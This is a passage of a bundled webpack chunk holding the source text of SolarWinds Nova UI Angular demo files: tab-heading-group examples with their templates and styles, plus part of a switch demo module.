"switch-test",\n        component: SwitchTestComponent,\n    },\n    {\n        path: "switch-visual-test",\n        component: SwitchVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiSwitchModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        SwitchDisableExampleComponent,\n        SwitchDocsExampleComponent,\n        SwitchSimpleExampleComponent,\n        SwitchTestComponent,\n        SwitchValueChangeExampleComponent,\n        SwitchVisualTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("switch"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class SwitchModule {}\n'},20489:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./tabgroup-docs/tabgroup-docs.example.component";\nexport * from "./tab-heading-group-test/tab-heading-group-test.component";\nexport * from "./tab-heading-group-with-router/tab-content/about/tab-content-about.example.component";\nexport * from "./tab-heading-group-with-router/tab-content/settings/tab-content-settings.example.component";\nexport * from "./tab-heading-group-with-router/tab-content/statistics/tab-content-statistics.example.component";\nexport * from "./tab-heading-group-with-icons/tab-heading-group-with-icons.example.component";\nexport * from "./tab-heading-group-horizontal/tab-heading-group-horizontal.example.component";\nexport * from "./tab-heading-group-horizontal-with-icons/tab-heading-group-horizontal-with-icons.example.component";\nexport * from "./tab-heading-group-horizontal-with-icons-only/tab-heading-group-horizontal-with-icons-only.example.component";\nexport * from "./tab-heading-group-with-content/tab-heading-group-with-content.example.component";\nexport * from "./tab-heading-group-dynamic/tab-heading-group-dynamic.example.component";\nexport * from "./tab-heading-group-with-router/tab-heading-group-with-router.example.component";\nexport * from "./tab-heading-group-vertical/tab-heading-group-vertical.example.component";\nexport * from "./tab-heading-group-vertical-with-icons/tab-heading-group-vertical-with-icons.example.component";\nexport * from "./tab-heading-group-responsive/tab-heading-group-responsive.example.component";\n'},91507:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-tab-heading-group (selected)="updateContent($event)">\n        <nui-tab-heading\n            *ngFor="let tab of tabsetContent"\n            [tabId]="tab.id"\n            [active]="currentTabId === tab.id"\n        >\n            <div class="d-flex align-content-center">\n                <div class="d-inline-flex align-items-center">\n                    <div class="ellipsis">\n                        <span [title]="tab.title">{{ tab.title }}</span>\n                    </div>\n                </div>\n            </div>\n        </nui-tab-heading>\n    </nui-tab-heading-group>\n\n    <div *ngFor="let tab of tabsetContent">\n        <nui-content size="small" *ngIf="currentTabId === tab.id">\n            <p>\n                Tab titeled <strong>{{ tab.title }}</strong> with id\n                <strong>{{ tab.id }}</strong\n                >. It\'s content goes below:\n            </p>\n            <p>{{ tab.content }}</p>\n        </nui-content>\n    </div>\n</div>\n\n<div class="m-5">\n    <button nui-button type="button" (click)="addTab()" class="m-5">\n        Add Tab To End\n    </button>\n    <button nui-button type="button" (click)="popTab()" class="m-5">\n        Remove Tab From End\n    </button>\n</div>\n'},16695:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".ellipsis {\n    max-width: 100px;\n    overflow: hidden;\n    text-overflow: ellipsis;\n}\n"},33611:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tab-heading-group-dynamic-example",\n    templateUrl: "./tab-heading-group-dynamic.example.component.html",\n    styleUrls: ["./tab-heading-group-dynamic.example.component.less"],\n})\nexport class TabHeadingGroupDynamicExampleComponent {\n    public currentTabId: string;\n\n    public tabsetContent: any[] = [];\n\n    constructor(private changeDetector: ChangeDetectorRef) {\n        // "Dynamically" build first 2 tabs\n        this.addTab();\n        this.addTab();\n    }\n\n    public updateContent(tabId: string): void {\n        this.currentTabId = tabId;\n        this.changeDetector.detectChanges();\n    }\n\n    public addTab(): void {\n        const nextIndex = this.tabsetContent.length + 1;\n        this.tabsetContent.push({\n            id: `${nextIndex}`,\n            title: $localize`Tab ` + nextIndex,\n            content: "Lorem ipsum #" + nextIndex,\n        });\n    }\n\n    public popTab(): void {\n        const lastIndex = this.tabsetContent.length - 1;\n        if (lastIndex < 1) {\n            // no sense to remove last tab\n            return;\n        }\n        if (this.tabsetContent[lastIndex].id === this.currentTabId) {\n            this.currentTabId = this.tabsetContent[lastIndex - 1].id;\n        }\n        this.tabsetContent.pop();\n    }\n}\n'},13125:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-tab-heading-group (selected)="updateContent($event)">\n        <nui-tab-heading\n            *ngFor="let tab of tabsetContent"\n            [disabled]="tab.isDisabled"\n            [tabId]="tab.id"\n        >\n            <div class="d-flex align-content-center">\n                <div class="d-inline-flex align-items-center">\n                    <nui-icon\n                        [icon]="tab.icon.name"\n                        [iconColor]="\n                            tab.isDisabled\n                                ? tab.icon.disabledColor\n                                : currentTabId === tab.id\n                                ? tab.icon.activeColor\n                                : tab.icon.inactiveColor\n                        "\n                    >\n                    </nui-icon>\n                </div>\n            </div>\n        </nui-tab-heading>\n    </nui-tab-heading-group>\n</div>\n'},35161:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".ellipsis {\n    max-width: 100px;\n    overflow: hidden;\n    text-overflow: ellipsis;\n}\n"},5473:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tab-heading-group-horizontal-with-icons-only-example",\n    templateUrl:\n        "./tab-heading-group-horizontal-with-icons-only.example.component.html",\n    styleUrls: [\n        "./tab-heading-group-horizontal-with-icons-only.example.component.less",\n    ],\n})\nexport class TabHeadingGroupHorizontalWithIconsOnlyExampleComponent {\n    public currentTabId: string;\n\n    public tabsetContent = [\n        {\n            id: "1",\n            title: $localize`Tab with really long content`,\n            icon: {\n                name: "gear",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n        {\n            id: "2",\n            title: $localize`Tab 2`,\n            icon: {\n                name: "check",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n        {\n            id: "3",\n            title: $localize`Tab 3`,\n            icon: {\n                name: "acknowledge",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: true,\n        },\n        {\n            id: "4",\n            title: $localize`Tab 4`,\n            icon: {\n                name: "add",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n    ];\n\n    constructor(private changeDetector: ChangeDetectorRef) {}\n\n    public updateContent(tabId: string): void {\n        this.currentTabId = tabId;\n        this.changeDetector.detectChanges();\n    }\n}\n'},7383:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-tab-heading-group (selected)="updateContent($event)">\n        <nui-tab-heading\n            *ngFor="let tab of tabsetContent"\n            [disabled]="tab.isDisabled"\n            [tabId]="tab.id"\n        >\n            <div class="d-flex align-content-center">\n                <div class="d-inline-flex align-items-center">\n                    <nui-icon\n                        class="pr-2"\n                        [icon]="tab.icon.name"\n                        [iconColor]="\n                            tab.isDisabled\n                                ? tab.icon.disabledColor\n                                : currentTabId === tab.id\n                                ? tab.icon.activeColor\n                                : tab.icon.inactiveColor\n                        "\n                    ></nui-icon>\n                    <div class="ellipsis">\n                        <span title="{{ tab.title }}">{{ tab.title }}</span>\n                    </div>\n                </div>\n            </div>\n        </nui-tab-heading>\n    </nui-tab-heading-group>\n</div>\n'},24035:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".ellipsis {\n    max-width: 100px;\n    overflow: hidden;\n    text-overflow: ellipsis;\n}\n"},33807:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tab-heading-group-horizontal-with-icons-example",\n    templateUrl:\n        "./tab-heading-group-horizontal-with-icons.example.component.html",\n    styleUrls: [\n        "./tab-heading-group-horizontal-with-icons.example.component.less",\n    ],\n})\nexport class TabHeadingGroupHorizontalWithIconsExampleComponent {\n    public currentTabId: string;\n\n    public tabsetContent = [\n        {\n            id: "1",\n            title: $localize`Tab with really long content`,\n            icon: {\n                name: "gear",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n        {\n            id: "2",\n            title: $localize`Tab 2`,\n            icon: {\n                name: "check",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n        {\n            id: "3",\n            title: $localize`Tab 3`,\n            icon: {\n                name: "acknowledge",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: true,\n        },\n        {\n            id: "4",\n            title: $localize`Tab 4`,\n            icon: {\n                name: "add",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n    ];\n\n    constructor(private changeDetector: ChangeDetectorRef) {}\n\n    public updateContent(tabId: string): void {\n        this.currentTabId = tabId;\n        this.changeDetector.detectChanges();\n    }\n}\n'},62327:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-tab-heading-group (selected)="updateContent($event)">\n        <nui-tab-heading\n            *ngFor="let tab of tabsetContent"\n            [disabled]="tab.isDisabled"\n            [tabId]="tab.id"\n        >\n            <div class="d-flex align-content-center">\n                <div class="ellipsis">\n                    <span title="{{ tab.title }}">{{ tab.title }}</span>\n                </div>\n            </div>\n        </nui-tab-heading>\n    </nui-tab-heading-group>\n</div>\n'},32003:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".ellipsis {\n    max-width: 100px;\n    overflow: hidden;\n    text-overflow: ellipsis;\n}\n"},34447:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tab-heading-group-horizontal-example",\n    templateUrl: "./tab-heading-group-horizontal.example.component.html",\n    styleUrls: ["./tab-heading-group-horizontal.example.component.less"],\n})\nexport class TabHeadingGroupHorizontalExampleComponent {\n    public currentTabId: string;\n\n    public tabsetContent = [\n        {\n            id: "1",\n            title: $localize`Tab with really long content`,\n            isDisabled: false,\n        },\n        {\n            id: "2",\n            title: $localize`Tab 2`,\n            isDisabled: false,\n        },\n        {\n            id: "3",\n            title: $localize`Tab 3`,\n            isDisabled: true,\n        },\n        {\n            id: "4",\n            title: $localize`Tab 4`,\n            isDisabled: false,\n        },\n    ];\n\n    constructor(private changeDetector: ChangeDetectorRef) {}\n\n    public updateContent(tabId: string): void {\n        this.currentTabId = tabId;\n        this.changeDetector.detectChanges();\n    }\n}\n'},71767:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="set-container-max-width">\n    <nui-tab-heading-group (selected)="updateContent($event)">\n        <nui-tab-heading\n            *ngFor="let tab of tabsetContent"\n            [disabled]="tab.isDisabled"\n            [tabId]="tab.id"\n        >\n            <div class="d-flex align-content-center">\n                <div class="d-inline-flex align-items-center">\n                    <div>\n                        <span title="{{ tab.title }}">{{ tab.title }}</span>\n                    </div>\n                </div>\n            </div>\n        </nui-tab-heading>\n    </nui-tab-heading-group>\n</div>\n'},88399:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component, Input } from "@angular/core";\n\n@Component({\n    selector: "nui-tab-heading-group-responsive-example",\n    styles: [\n        `\n            .set-container-max-width {\n                max-width: 1000px;\n            }\n        `,\n    ],\n    templateUrl: "./tab-heading-group-responsive.example.component.html",\n})\nexport class TabHeadingGroupResponsiveExampleComponent {\n    @Input() public icon: boolean = false;\n\n    public currentTabId: string;\n    public tabsetContent: object[] = [];\n\n    constructor(private changeDetector: ChangeDetectorRef) {\n        this.setTabs();\n    }\n\n    public updateContent(tabId: string): void {\n        this.currentTabId = tabId;\n        this.changeDetector.detectChanges();\n    }\n\n    public setTabs(tabsAmount: number = 20): void {\n        for (let i = 1; i < tabsAmount; i++) {\n            this.tabsetContent.push({\n                id: i.toString(),\n                title: $localize`Tab ${i.toString()}`,\n            });\n        }\n    }\n}\n'},80947:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="mb-5 d-flex flex-row justify-content-between">\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-horizontal-example\n                id="nui-demo-visual-tabgroup-horizontal"\n            ></nui-tab-heading-group-horizontal-example>\n        </div>\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-horizontal-with-icons-example\n                id="nui-demo-visual-tabgroup-horizontal-icons"\n            ></nui-tab-heading-group-horizontal-with-icons-example>\n        </div>\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-horizontal-with-icons-only-example\n                id="nui-demo-visual-tabgroup-horizontal-icons-only"\n            ></nui-tab-heading-group-horizontal-with-icons-only-example>\n        </div>\n    </div>\n    <div class="mb-5 d-flex flex-row justify-content-between">\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-vertical-example\n                id="nui-demo-visual-tabgroup-vertical"\n            ></nui-tab-heading-group-vertical-example>\n        </div>\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-vertical-with-icons-example\n                id="nui-demo-visual-tabgroup-vertical-icons"\n            ></nui-tab-heading-group-vertical-with-icons-example>\n        </div>\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-with-icons-example\n                id="nui-demo-visual-tabgroup-vertical-icons-only"\n            ></nui-tab-heading-group-with-icons-example>\n        </div>\n    </div>\n    <div class="mb-5 d-flex flex-row justify-content-center">\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-responsive-example\n                id="nui-demo-visual-tabgroup-responsive"\n            ></nui-tab-heading-group-responsive-example>\n        </div>\n    </div>\n    <div class="mb-5 d-flex flex-row justify-content-center">\n        <div class="d-flex flex-column">\n            <nui-tab-heading-group-with-content-example\n                id="nui-demo-visual-tabgroup-with-content"\n            ></nui-tab-heading-group-with-content-example>\n        </div>\n    </div>\n</div>\n'},86859:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tab-heading-group-test",\n    templateUrl: "./tab-heading-group-test.component.html",\n})\nexport class TabHeadingGroupTestComponent {}\n'},15975:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-tab-heading-group [vertical]="true" (selected)="updateContent($event)">\n        <nui-tab-heading\n            *ngFor="let tab of tabsetContent"\n            [disabled]="tab.isDisabled"\n            [tabId]="tab.id"\n        >\n            <div class="d-flex align-content-center">\n                <div class="d-inline-flex align-items-center">\n                    \x3c!-- That ternary operator below (bind to [iconColor]) applies different colors depending on \n                         whether the tab is disabled, active, or inactive. Note that the icon color must follow \n                         the tab title color, according to UX requirements --\x3e\n                    <nui-icon\n                        class="pr-2"\n                        [icon]="tab.icon.name"\n                        [iconColor]="\n                            tab.isDisabled\n                                ? tab.icon.disabledColor\n                                : currentTabId === tab.id\n                                ? tab.icon.activeColor\n                                : tab.icon.inactiveColor\n                        "\n                    ></nui-icon>\n                    <span>{{ tab.title }}</span>\n                </div>\n            </div>\n        </nui-tab-heading>\n    </nui-tab-heading-group>\n</div>\n'},34335:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tab-heading-group-vertical-with-icons-example",\n    templateUrl:\n        "./tab-heading-group-vertical-with-icons.example.component.html",\n})\nexport class TabHeadingGroupVerticalWithIconsExampleComponent {\n    public currentTabId: string;\n\n    public tabsetContent = [\n        {\n            id: "1",\n            title: $localize`Tab 1`,\n            icon: {\n                name: "gear",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n        {\n            id: "2",\n            title: $localize`Tab 2`,\n            icon: {\n                name: "check",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n        {\n            id: "3",\n            title: $localize`Tab 3`,\n            icon: {\n                name: "acknowledge",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: true,\n        },\n        {\n            id: "4",\n            title: $localize`Tab 4`,\n            icon: {\n                name: "add",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n    ];\n\n    constructor(private changeDetector: ChangeDetectorRef) {}\n\n    public updateContent(tabId: string): void {\n        this.currentTabId = tabId;\n        this.changeDetector.detectChanges();\n    }\n}\n'},53271:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-tab-heading-group vertical="true" (selected)="updateContent($event)">\n        <nui-tab-heading\n            *ngFor="let tab of tabsetContent"\n            [disabled]="tab.isDisabled"\n            [tabId]="tab.id"\n        >\n            <div class="d-flex align-content-center">\n                <span>{{ tab.title }}</span>\n            </div>\n        </nui-tab-heading>\n    </nui-tab-heading-group>\n</div>\n'},93999:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tab-heading-group-vertical-example",\n    templateUrl: "./tab-heading-group-vertical.example.component.html",\n})\nexport class TabHeadingGroupVerticalExampleComponent {\n    public currentTabId: string;\n\n    public tabsetContent = [\n        {\n            id: "1",\n            title: $localize`Tab 1`,\n            icon: {\n                name: "gear",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n        {\n            id: "2",\n            title: $localize`Tab 2`,\n            icon: {\n                name: "check",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n        {\n            id: "3",\n            title: $localize`Tab 3`,\n            icon: {\n                name: "acknowledge",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: true,\n        },\n        {\n            id: "4",\n            title: $localize`Tab 4`,\n            icon: {\n                name: "add",\n                disabledColor: "disabled-gray",\n                inactiveColor: "gray",\n                activeColor: "black",\n            },\n            isDisabled: false,\n        },\n    ];\n\n    constructor(private changeDetector: ChangeDetectorRef) {}\n\n    public updateContent(tabId: string): void {\n        this.currentTabId = tabId;\n        this.changeDetector.detectChanges();\n    }\n}\n'},18887:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-tab-heading-group (selected)="updateContent($event)">\n        <nui-tab-heading\n            *ngFor="let tab of tabsetContent"\n            [disabled]="tab.isDisabled"\n            [tabId]="tab.id"\n        >\n            <div class="d-flex align-content-center">\n                <div class="d-inline-flex align-items-center">\n                    <nui-icon\n                        class="pr-2"\n                        *ngIf="icon"\n                        [icon]="tab.icon.name"\n                        [iconColor]="\n                            tab.isDisabled\n                                ? tab.icon.disabledColor\n                                : currentTabId === tab.id\n                                ? tab.icon.activeColor\n                                : 